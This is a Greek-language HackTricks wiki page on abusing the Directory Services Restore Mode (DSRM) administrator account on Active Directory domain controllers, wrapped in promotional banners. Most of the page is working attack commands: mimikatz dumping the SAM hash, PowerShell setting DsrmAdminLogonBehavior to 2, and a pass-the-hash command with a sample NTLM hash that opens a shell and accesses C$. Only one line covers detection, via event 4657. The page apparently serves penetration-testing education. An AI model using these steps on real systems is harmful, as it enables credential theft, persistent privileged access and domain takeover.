<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


# Διαπιστευτήρια DSRM

Υπάρχει ένας **τοπικός διαχειριστής** λογαριασμός μέσα σε κάθε **DC**. Έχοντας δικαιώματα διαχειριστή σε αυτήν τη μηχανή, μπορείτε να χρησιμοποιήσετε το mimikatz για να **αντλήσετε το hash του τοπικού διαχειριστή**. Στη συνέχεια, τροποποιώντας ένα μητρώο για να **ενεργοποιήσετε αυτόν τον κωδικό πρόσβασης**, μπορείτε να έχετε απομακρυσμένη πρόσβαση σε αυτόν τον τοπικό διαχειριστή χρήστη.\
Πρώτα πρέπει να **αντλήσουμε** το **hash** του **τοπικού διαχειριστή** χρήστη μέσα στο DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Στη συνέχεια, πρέπει να ελέγξουμε εάν αυτός ο λογαριασμός θα λειτουργήσει και εάν το κλειδί του μητρώου έχει την τιμή "0" ή δεν υπάρχει, πρέπει να **το ορίσετε σε "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Στη συνέχεια, χρησιμοποιώντας ένα PTH μπορείτε να **εμφανίσετε το περιεχόμενο του C$ ή ακόμα και να αποκτήσετε ένα κέλυφος**. Παρατηρήστε ότι για τη δημιουργία μιας νέας συνεδρίας powershell με αυτό το hash στη μνήμη (για το PTH) **το "domain" που χρησιμοποιείται είναι απλώς το όνομα της μηχανής DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Περισσότερες πληροφορίες σχετικά με αυτό μπορείτε να βρείτε στις ακόλουθες διευθύνσεις: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) και [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Αντιμετώπιση

* Αρ. Συμβάντος 4657 - Ελέγχος δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`


<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
